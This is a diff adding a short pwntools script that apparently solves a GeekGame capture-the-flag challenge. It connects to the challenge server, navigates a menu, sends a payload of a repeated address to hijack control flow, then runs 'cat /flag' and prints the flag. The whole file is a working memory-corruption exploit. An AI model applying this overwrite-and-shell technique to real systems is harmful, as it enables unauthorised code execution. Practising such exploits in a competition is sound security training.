@@ -1,0 +1,21 @@
+from pwn import *
+
+conn = remote("prob12.geekgame.pku.edu.cn", 10012)
+conn.recvuntil(b"Please input your token: ")
+conn.send(b"<MY TOKEN>\n")
+conn.recvuntil(b">>")
+conn.send(b"1\n")
+conn.recvuntil(b"node key:")
+conn.send(b"0\n")
+conn.recvuntil(b"size of the data:")
+conn.send(b"488\n")
+conn.recvuntil(b"data:")
+conn.send(p64(0x401243) * 64 + b"\n")
+conn.recvuntil(b">>")
+conn.send(b"4\n")
+conn.send(b"cat /flag\n")
+line = conn.recvline().decode()
+while not line.startswith("flag{"):
+  line = conn.recvline().decode()
+print(line)
+conn.close()
